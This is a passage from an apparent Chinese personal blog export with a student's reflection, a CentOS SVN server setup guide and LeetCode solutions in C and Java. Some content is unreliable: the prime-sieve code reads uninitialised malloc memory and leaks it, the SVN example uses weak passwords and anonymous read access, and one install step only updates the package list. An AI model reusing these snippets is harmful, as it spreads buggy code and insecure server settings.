    <content><![CDATA[<p>　　大学的最后一个暑假已经结束，明天就是九月了，开学已经好几天，但是根本没有任何开学的感觉，毕竟都是大四的老腊肉了。没有一节课的大四生活就这样悄悄地开始了，不知道接下来会发生什么，也不知道这一年自己可以做些什么，有时候选择很多也未必是好事，因为这样会很迷茫。就像现在的我，每天都觉得很迷茫，但是我还是按照既定的计划每天向前走着。这样的日子说不上很美好，但是却很安静，也很满足。</p>
<a id="more"></a> 
<p>　　这个暑假，基本的安排都在有序的进行着，虽然总会有一些烦人的事情，也会有担忧，但是都还是坚持下来了。最近看了鲁豫有约之大咖一日行第一期王健林的那个视频，这些大咖总是又让我们很佩服的事情，虽然他们肯定有过人之处，就像他那句话刷爆了朋友圈的话：先定一个小目标，比方说我先挣它一个亿。我觉得确实说得很对啊，抛开大家对于一个亿是小目标的玩笑，认真想想，很多时候，我们就是缺少一个实际一点的目标。我们可以根据自己的实际情况对自己定一些小目标，然后关键就在于我们能不能坚持去做了。我也给自己定过很多小目标，有的完成了，有的没完成，但是这个过程中收获还是有的。</p>
<p>　　先定一个小目标，比方说我先写它30篇博客。暑假，在复习之余也一直在更新自己的博客，我始终认为技术不能丢，安卓和算法这是这个暑假主要在学习的两块内容。暑假写了差不多30篇博客，有时候也会很烦，写一篇博客确实需要花费很多的精力，从选题到拟定提纲、到查阅资料、编写实例，再到格式整理等等，这个过程其实是很漫长而又艰难的，有时候也会想要放弃，但是每次写完都还是很有成就感的。虽然可能自己写的博客没有多少人来看，但是这都不重要，写博客本来就是对自我学习的总结以及对自己写作能力的锻炼。</p>
<p>　　考研这条路不再像高考，高考的时候你的身边都是为了考大学这一个目标，但是现在似乎不再有以前的那种氛围，那股冲劲，身边很多人都去实习了，留下的也基本都在等秋招，自己也投了一些简历，想去试试。现在的生活真的很安静，早上早起打打球，白天静静地待在图书馆学习，晚上静静地在寝室写代码写博客，没有什么压力，也没有什么束缚，其实这样也挺好。</p>
<p>　　不管怎么说，信心还是要有的。一直以来对于自己的自学能力还是很有信心的，大学里学到的很多技术也都是靠自己查资料、实践以及向老师学长学姐请教学来的。但是也开始意识到自己薄弱的地方，慢慢懂得数据结构与算法是软件的核心，不管是考研还是找工作，数据结构与算法都是很重要的知识。虽然有些技能不需要人教我就可以很快掌握，但是在数据结构和算法方面自己还是很欠缺的。不想做一个只会写代码的底层码农，而想要成为有思想的程序员，要慢慢地朝着架构师的方向发展。</p>
<p>　　不知道九月甚至是大四的这一年会发生些什么，也不知道接下来我会怎样走下去，虽然迷茫但是从来不畏惧，相信努力、勤奋与坚持会带来改变。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS-7 SVN 服务器配置</title>
    <url>/2016/08/30/CentOS-7%20SVN%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>　　SVN 是 Subversion 的简称，它是一个受欢迎的开放源代码的版本控制系统。简单一点说，SVN 就是用于多个人共同开发同一个项目，共用资源的目的。作为软件开发人员，很有必要了解和学习 SVN 的使用。学习版本控制从 SVN 安装与配置开始，此篇博客主要讲解基于阿里云服务器的 SVN 服务器配置。</p>
<a id="more"></a> 
<h4 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h4><p>　　版本控制系统（VCS）是一个软件，帮助软件开发人员团队工作并维持他们完整的工作历史。版本控制系统（VCS）的目标：</p>
<ul>
<li>允许开发者们同时工作</li>
<li>不会重写每个人的改变</li>
<li>维持每个版本的全部的历史</li>
</ul>
<p>VCS 被分成两种：</p>
<ul>
<li>集中版本控制系统（CVCS）和</li>
<li>分散或不集中的版本控制系统（DVCS）</li>
</ul>
<p>Subversion 基于集中的版本控制系统，意味着使用统一的服务器让团队协作。</p>
<h4 id="安装SVN"><a href="#安装SVN" class="headerlink" title="安装SVN"></a>安装SVN</h4><p>　　大多数 GNU/Linux 发行版系统自带，所以它很有可能已经安装在你的系统上了。可以使用下面命令检查是否安装了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> svn --version</div></pre></td></tr></table></figure>
<p>　　如果系统已经安装 Subversion 客户端，使用上面的命令会出现安装的软件版本，否则会提示命令找不到。如果你使用基于 RPM 的 GNU/Linux，可以切换到 root 用户使用 yum 命令进行安装，安装成功之后，执行 svn –version 命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> yum install subversion</div></pre></td></tr></table></figure>
<p>　　如果你使用基于 Debian 的 GNU/Linux，使用 apt 命令进行安装。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> sudo apt-get update</div></pre></td></tr></table></figure>
<p>　　另外，还需要安装 Apache httpd 模块，如果没有安装请自行百度吧，这里主要讲解如何配置 SVN。</p>
<p>　　注：博主租用的阿里云的服务器，采用 CentOS 系统，自带 SVN，并且我已经安装好了 Apache httpd 模块。</p>
<h4 id="创建目录保存所有的工作"><a href="#创建目录保存所有的工作" class="headerlink" title="创建目录保存所有的工作"></a>创建目录保存所有的工作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> mkdir -p /var/svn</div></pre></td></tr></table></figure>
<h4 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h4><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> svnadmin create /var/svn/repo</div></pre></td></tr></table></figure>
<p>　　创建完成后，可以使用 ls 命令看到，在版本库中存在如下文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> conf db format hooks locks README.txt</div></pre></td></tr></table></figure>
<h4 id="配置版本库"><a href="#配置版本库" class="headerlink" title="配置版本库"></a>配置版本库</h4><p>在 conf 目录下有如下三个文件：</p>
<ul>
<li><p>svn 服务综合配置文件（svnserve.conf）</p>
</li>
<li><p>用户名口令文件（passwd）</p>
</li>
<li><p>权限配置文件（authz）</p>
</li>
</ul>
<h5 id="配置-svnserve-conf-文件"><a href="#配置-svnserve-conf-文件" class="headerlink" title="配置 svnserve.conf 文件"></a>配置 svnserve.conf 文件</h5><p>　　找到以下四行，删除前面的注释符使其起作用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">anon-access = read  #匿名用户可读</div><div class="line">auth-access = write #授权用户可写</div><div class="line">password-db = passwd    #使用哪个文件作为账号文件</div><div class="line">authz-db = authz.conf   #使用哪个文件作为权限文件</div></pre></td></tr></table></figure>
<h5 id="配置-passwd-文件"><a href="#配置-passwd-文件" class="headerlink" title="配置 passwd 文件"></a>配置 passwd 文件</h5><p>　　在 [users] 块中添加用户和密码，格式：帐号=密码，例如添加如下两个账户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[users]</div><div class="line">fzy = 123456</div><div class="line">hunau = 111111</div></pre></td></tr></table></figure>
<h5 id="配置-authz-文件"><a href="#配置-authz-文件" class="headerlink" title="配置 authz 文件"></a>配置 authz 文件</h5><p>　　在末尾添加如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[/]</div><div class="line">fzy = rw</div><div class="line">hunau = r</div></pre></td></tr></table></figure>
<p>　　意思是版本库的根目录 fzy 用户对其有读写权限，hunau 用户只有读权限。</p>
<h4 id="启动和使用"><a href="#启动和使用" class="headerlink" title="启动和使用"></a>启动和使用</h4><p>　　配置成功以后，使用如下命令启动 svn 版本库服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> svnserve -d -r /var/svn     #其中/var/svn为版本库根目录</div></pre></td></tr></table></figure>
<p>　　查看是否启动成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> ps -ef|grep svnserve</div></pre></td></tr></table></figure>
<h5 id="关闭-svn-服务"><a href="#关闭-svn-服务" class="headerlink" title="关闭 svn 服务"></a>关闭 svn 服务</h5><ol>
<li>使用以下命令查找进程 </li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">ps aux | grep svn</div></pre></td></tr></table></figure>
<p>　　如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">root     22368     1  0 Aug29 ?        00:00:00 svnserve -d -r /var/svn</div><div class="line">root     24538 24423  0 19:58 pts/0    00:00:00 grep --color=auto svn</div></pre></td></tr></table></figure></p>
<ol>
<li>使用Kill命令杀死进程 </li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">kill -s 9 22368     #其中22368 为进程ID</div></pre></td></tr></table></figure>
<h4 id="Windwos-客户端安装与使用"><a href="#Windwos-客户端安装与使用" class="headerlink" title="Windwos 客户端安装与使用"></a>Windwos 客户端安装与使用</h4><ol>
<li>下载安装 SVN Windows 客户端：TortoiseSVN</li>
</ol>
<p>下载地址：<a href="https://tortoisesvn.net/downloads.html" target="_blank" rel="external">https://tortoisesvn.net/downloads.html</a></p>
<ol>
<li><p>新建一个文件夹用来存放版本库文件</p>
</li>
<li><p>右键选择 SVN Checkout</p>
</li>
</ol>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/30-1.png" alt="30-1"></p>
<ol>
<li>填写 SVN 地址</li>
</ol>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/30-2.png" alt="30-2"></p>
<p>　　格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">svn://服务器ip地址/服务器上版本库名称/</div></pre></td></tr></table></figure>
<ol>
<li>输入用户名密码</li>
</ol>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/30-3.png" alt="30-3"></p>
<p>　　可以勾选保存账号密码，如果你只用一个账号的话可以这么做，如果需要经常切换账户的话最好不要勾选。如果已经勾选了，但是又需要切换账户，怎么办呢？</p>
<p>　　右键菜单：Settings -&gt; Saved Data-&gt; Authentication data -&gt; Clear</p>
<ol>
<li>在 repo 文件夹下进行版本控制操作</li>
</ol>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/30-4.png" alt="30-4"></p>
<p>　　可以将服务器上的文件通过 SVN Update 更新到本地，也可以将本地文件通过 SVN commit 提交到服务器，还有很多的操作，在这里就不一一讲解了，下次写一篇详细的博客进行介绍。</p>
<p>　　注：文件上传到服务器后存放在服务器什么地方呢？</p>
<p>　　一般放在版本库路径下的 db 文件夹的 revs 文件夹中，例如我的为 /var/svn/repo/db/revs。</p>
<h4 id="需要注意的地方"><a href="#需要注意的地方" class="headerlink" title="需要注意的地方"></a>需要注意的地方</h4><h5 id="checkout时，提示：URL-svn-服务器ip地址-repo-doesn’t-exist…"><a href="#checkout时，提示：URL-svn-服务器ip地址-repo-doesn’t-exist…" class="headerlink" title="checkout时，提示：URL svn://服务器ip地址/repo doesn’t exist…"></a>checkout时，提示：URL svn://服务器ip地址/repo doesn’t exist…</h5><p>　　奇怪，怎么会提示库不存在呢？肯定是哪里配置问题。后来尝试了半天，也在网上搜索了很久，终于发现问题所在。</p>
<p>　　如果你的 SVN 库的路径为：/var/svn/repo，那么你启动时，不能用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">svnserve -d -r /var/svn/repo</div></pre></td></tr></table></figure>
<p>　　而要用命令：<br><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">svnserve -d -r /var/svn/</div></pre></td></tr></table></figure></p>
<h5 id="commit时，提示：Authorization-failed"><a href="#commit时，提示：Authorization-failed" class="headerlink" title="commit时，提示：Authorization failed"></a>commit时，提示：Authorization failed</h5><p>　　问题可能出在 svnserve.conf 这个文件。注意以下四行一定要取消注释：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># anon-access = read</div><div class="line"># auth-access = write</div><div class="line"># password-db = passwd</div><div class="line"># authz-db = authz</div></pre></td></tr></table></figure>
<p>　　问题也有可能出在 authz 文件里，用户组或者用户权限没有配置好，只要设置[/]就可以，代表根目录下所有的资源，如果要限定资源，可以加上子目录即可。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SVN</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(七)</title>
    <url>/2016/08/27/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B8%83/</url>
    <content><![CDATA[<h4 id="Happy-Number"><a href="#Happy-Number" class="headerlink" title="Happy Number"></a>Happy Number</h4><p>LeetCode第202题</p>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>Write an algorithm to determine if a number is “happy”.</p>
<a id="more"></a>
<p>A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.</p>
<p>Example: 19 is a happy number</p>
<p>1^2 + 9^2 = 82</p>
<p>8^2 + 2^2 = 68</p>
<p>6^2 + 8^2 = 100</p>
<p>1^2 + 0^2 + 0^2 = 1</p>
<h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>快乐数（happy number）有以下的特性：在给定的进位制下，该数字所有数位(digits)的平方和，得到的新数再次求所有数位的平方和，如此重复进行，最终结果必为1。</p>
<p>如果一个数是一个happy number，那么最终是1循环，比较容易判断。如果一个数不是 happy number，那么存在一个循环，其中不包含1，这就比较难判断，因为不清楚这个循环周期大小。一种解决思路是通过HashSet来存取数字，如果这个数字之前存储好了，说明进入一个循环。利用HashSet元素不重复的性质，采用add方法，它会返回一个boolean值，如果集合中已经存在该元素返回false，否则返回true。</p>
<h5 id="Java语言实现"><a href="#Java语言实现" class="headerlink" title="Java语言实现"></a>Java语言实现</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></div><div class="line">    <span class="function"><span class="keyword">public</span> boolean <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">        Set&lt;Integer&gt; records = <span class="keyword">new</span> HashSet&lt;Integer&gt;();</div><div class="line">        <span class="keyword">while</span>(n!=<span class="number">1</span>)&#123;</div><div class="line">            <span class="keyword">if</span>(!records.add(n))     <span class="comment">//把结果添加到记录中，如果集合中已经存在该元素则判断为非快乐数</span></div><div class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">            <span class="keyword">else</span>&#123;</div><div class="line">                <span class="keyword">int</span> sum = <span class="number">0</span>;  </div><div class="line">                <span class="keyword">while</span>(n!=<span class="number">0</span>)&#123;    <span class="comment">//依次得到各个位的平方数并加起来</span></div><div class="line">                    <span class="keyword">int</span> digit = n%<span class="number">10</span>;</div><div class="line">                    sum = sum + digit*digit;</div><div class="line">                    n = n/<span class="number">10</span>;</div><div class="line">                &#125;  </div><div class="line">                n = sum;    <span class="comment">//把结果赋给n</span></div><div class="line">            &#125;  </div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这道题目自己用C语言一直没有AC出来，于是上网找了找资料，所有不快乐数的数位平方和计算，最后都会进入4 → 16 → 37 → 58 → 89 → 145 → 42 → 20 → 4的周期性循环。那如何判断周期性循环呢？这就需要用到Floyd判圈算法的思想了：</p>
<p>Floyd判圈算法(Floyd Cycle Detection Algorithm)，又称龟兔赛跑算法(Tortoise and Hare Algorithm)。该算法由美国科学家罗伯特·弗洛伊德发明，是一个可以在有限状态机、迭代函数或者链表上判断是否存在环，求出该环的起点与长度的算法。</p>
<p>初始状态下，假设已知某个起点节点为节点S。现设两个指针t和h，将它们均指向S。接着，同时让t和h往前推进，但是二者的速度不同：t每前进1步，h前进2步。只要二者都可以前进而且没有相遇，就如此保持二者的推进。当h无法前进，即到达某个没有后继的节点时，就可以确定从S出发不会遇到环。反之当t与h再次相遇时，就可以确定从S出发一定会进入某个环。</p>
<p>运用此思想进行解题：</p>
<h5 id="LeetCode-AC的代码"><a href="#LeetCode-AC的代码" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">digitSquareSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;     <span class="comment">//得到该数字所有数位的平方和</span></div><div class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, tmp;</div><div class="line">    <span class="keyword">while</span> (n) &#123;</div><div class="line">        tmp = n % <span class="number">10</span>;</div><div class="line">        sum += tmp * tmp;</div><div class="line">        n /= <span class="number">10</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> sum;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> slow, fast;</div><div class="line">    slow = fast = n;    <span class="comment">//都从n开始</span></div><div class="line">    <span class="keyword">do</span> &#123;</div><div class="line">        slow = digitSquareSum(slow);    <span class="comment">//前进一步，即计算一次</span></div><div class="line">        fast = digitSquareSum(fast);    <span class="comment">//前进两步，即计算两次</span></div><div class="line">        fast = digitSquareSum(fast);</div><div class="line">    &#125; <span class="keyword">while</span>(slow != fast);      <span class="comment">//直到两者相等</span></div><div class="line">    <span class="keyword">if</span> (slow == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;    <span class="comment">//判断最终结果是否为1</span></div><div class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个问题的关键是如何结束一个潜在的无限循环，下面给出别人的更高效的方法，确实很不错。上面说到：所有不快乐数的数位平方和计算，最后都会进入4 → 16 → 37 → 58 → 89 → 145 → 42 → 20 → 4的周期性循环。因此，一旦出现2或4，那就可以判断为非快乐数但是下面带给出的是小于5，等与1时肯定是快乐数，2和4肯定不是快乐数，但是3还不确定，不明白作者为什么这么写。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></div><div class="line">    <span class="function"><span class="keyword">public</span> boolean <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ( n &lt; <span class="number">5</span>) &#123;   <span class="comment">//结束的条件</span></div><div class="line">        <span class="keyword">if</span> (<span class="number">1</span> == n)</div><div class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="comment">// 得到各个位的数的平方和</span></div><div class="line">    <span class="keyword">while</span> ( n &gt;= <span class="number">10</span>) &#123;</div><div class="line">        sum += (n % <span class="number">10</span>) * (n % <span class="number">10</span>);</div><div class="line">        n = n / <span class="number">10</span>;</div><div class="line">    &#125;</div><div class="line">    sum += n * n;</div><div class="line"></div><div class="line">    <span class="keyword">return</span>  isHappy(sum);   <span class="comment">//递归调用</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Remove-Element"><a href="#Remove-Element" class="headerlink" title="Remove Element"></a>Remove Element</h4><p>LeetCode第27题</p>
<h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given an array and a value, remove all instances of that value in place and return the new length.</p>
<p>Do not allocate extra space for another array, you must do this in place with constant memory.</p>
<p>The order of elements can be changed. It doesn’t matter what you leave beyond the new length.</p>
<h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>删除数组中的指定元素，可以从头到尾遍历数组，判断是否等于目标数，如果不等于，则将其移到数组的前面。</p>
<p>例如：</p>
<p>数组nums为[1,2,2,3,2,4]，要删除的数为2</p>
<p>i=0，nums[0]不等于2，则有nums[0] = nums[0]; 数组为[1,2,2,3,2,4]，len=1</p>
<p>i=1，nums[1]等于2，继续下一次循环</p>
<p>i=2，nums[2]等于2，继续下一次循环</p>
<p>i=3，nums[3]不等于2，则有nums[1] = nums[3]; 数组为[1,3,2,3,2,4]，len=2</p>
<p>i=4，nums[4]等于2，继续下一次循环</p>
<p>i=5，nums[5]不等于2，则有nums[2] = nums[5]; 数组为[1,3,4,3,2,4]，len=3</p>
<p>返回len即可，数组的前len个数即为删除指定元素剩余的数组元素。</p>
<h5 id="LeetCode-AC的代码-1"><a href="#LeetCode-AC的代码-1" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> val)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> len = <span class="number">0</span>,i;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;numsSize;i++)&#123;    <span class="comment">//遍历数组</span></div><div class="line">        <span class="keyword">if</span>(nums[i] != val)      <span class="comment">//如果不等于目标数</span></div><div class="line">        &#123;</div><div class="line">            nums[len] = nums[i];    <span class="comment">//依次移到数组前端</span></div><div class="line">            len++;      <span class="comment">//记录不等于目标数的个数</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> len;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Delete-Node-in-a-Linked-List"><a href="#Delete-Node-in-a-Linked-List" class="headerlink" title="Delete Node in a Linked List"></a>Delete Node in a Linked List</h4><p>LeetCode第237题</p>
<h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>Write a function to delete a node (except the tail) in a singly linked list, given only access to that node.</p>
<p>Supposed the linked list is 1 -&gt; 2 -&gt; 3 -&gt; 4 and you are given the third node with value 3, the linked list should become 1 -&gt; 2 -&gt; 4 after calling your function.</p>
<p>Subscribe to see which companies asked this question</p>
<h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>要删除链表中指定的节点，可以用一个指针指向要删除结点的下一个结点，然后将指针指向的结点的数据域和指针域复制给要删除的结点，再释放掉指针指向的结点，这样就从链表中成功删除了该结点。</p>
<h5 id="LeetCode-AC的代码-2"><a href="#LeetCode-AC的代码-2" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Definition for singly-linked list.</div><div class="line"> * struct ListNode &#123;</div><div class="line"> *     int val;</div><div class="line"> *     struct ListNode *next;</div><div class="line"> * &#125;;</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(struct ListNode* node)</span> </span>&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">p</span> = <span class="title">node</span>-&gt;<span class="title">next</span>;</span>    <span class="comment">//指向要删除结点的下一个结点</span></div><div class="line">    node-&gt;val = p-&gt;val;     <span class="comment">//把下一个结点的数据域复制给要删除的结点</span></div><div class="line">    node-&gt;next = p-&gt;next;   <span class="comment">//把下一个结点的指针域复制给要删除的结点</span></div><div class="line">    <span class="built_in">free</span>(p);    <span class="comment">//释放下一个结点</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Count-Primes"><a href="#Count-Primes" class="headerlink" title="Count Primes"></a>Count Primes</h4><p>LeetCode第204题</p>
<h5 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h5><p>Description:</p>
<p>Count the number of prime numbers less than a non-negative number, n.</p>
<h5 id="思路分析-3"><a href="#思路分析-3" class="headerlink" title="思路分析"></a>思路分析</h5><p>素数是指除了1和它本身以外,不能被任何整数整除的数。这是一个很老但是很经典的问题，大一的时候就遇到过这个问题，那时候只要求做出来并不没有时间复杂度等要求，但是这个题目不一样。题目要求统计小于n的数中素数的个数，方法多种，但是如果使用最原始的方法一般都会超时的，所以需要一个高效的办法来解决这个问题。</p>
<p>（1）基本思路（提交时超时）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">countPrimes</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j,cnt=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;n;i++)&#123;</div><div class="line">        <span class="keyword">for</span>(j=<span class="number">2</span>;j&lt;=<span class="built_in">sqrt</span>(i);j++)&#123;    <span class="comment">//和比它的平方根小的数相除</span></div><div class="line">            <span class="keyword">if</span>(i%j==<span class="number">0</span>)  <span class="comment">//如果除尽了是合数  </span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(j&gt;<span class="built_in">sqrt</span>(i))   <span class="comment">//如果都不能除尽则是素数</span></div><div class="line">            cnt++;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> cnt;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>（2）利用数学规律解题</p>
<p>素数出现规律：<br>当n≧5时，如果n为素数，那么n mod 6 = 1 或 n mod 6 = 5，即n一定出现在6x（x≥1）两侧。</p>
<p>可以参考这篇博客：<a href="http://blog.csdn.net/code_pang/article/details/7880245" target="_blank" rel="external">高效判断素数方法</a></p>
<h5 id="LeetCode-AC的代码-1"><a href="#LeetCode-AC的代码-1" class="headerlink" title="LeetCode AC的代码(1)"></a>LeetCode AC的代码(1)</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPrime</span><span class="params">(<span class="keyword">int</span> num)</span>  </span></div><div class="line">&#123;  </div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">if</span>(num == <span class="number">2</span> || num == <span class="number">3</span>)  </div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </div><div class="line">    <span class="keyword">if</span> (num % <span class="number">6</span> != <span class="number">1</span> &amp;&amp; num % <span class="number">6</span> != <span class="number">5</span>)  </div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </div><div class="line">    <span class="keyword">for</span> (i=<span class="number">5</span>;i*i&lt;=num;i+=<span class="number">6</span>)  &#123;  </div><div class="line">        <span class="keyword">if</span>(num%i == <span class="number">0</span> || num%(i+<span class="number">2</span>) == <span class="number">0</span>)  </div><div class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">countPrimes</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j,cnt=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;n;i++)&#123;</div><div class="line">        <span class="keyword">if</span>(isPrime(i))</div><div class="line">            cnt++;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> cnt;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>（3）改进方法</p>
<p>定义一个n个数大小的数组，并全部初始化为0,从2开始判断，如果这个数为0，则将他的倍数都标记为1，比如将2的倍数4，6，8…等都标记为1，然后3的倍数6，9，12…都标记为1，最后统计遍历这些数的过程中为等于0的次数。</p>
<h5 id="LeetCode-AC的代码-2"><a href="#LeetCode-AC的代码-2" class="headerlink" title="LeetCode AC的代码(2)"></a>LeetCode AC的代码(2)</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">countPrimes</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j,cnt=<span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> *prime;</div><div class="line">    prime = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*n);   <span class="comment">//分配内存空间</span></div><div class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;n;i++)&#123;   <span class="comment">//遍历小于n的数</span></div><div class="line">        <span class="keyword">if</span>(prime[i] == <span class="number">0</span>)&#123;  <span class="comment">//如果这个数为0</span></div><div class="line">             cnt++;     <span class="comment">//记录加1</span></div><div class="line">             <span class="keyword">for</span>(j=<span class="number">2</span>;i*j&lt;n;j++)     <span class="comment">//将这个数的倍数都标记为1</span></div><div class="line">                prime[i*j] = <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> cnt;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android WebView 详解</title>
    <url>/2016/08/26/Android%20WebView%20%E8%AF%A6%E8%A7%A3/</url>
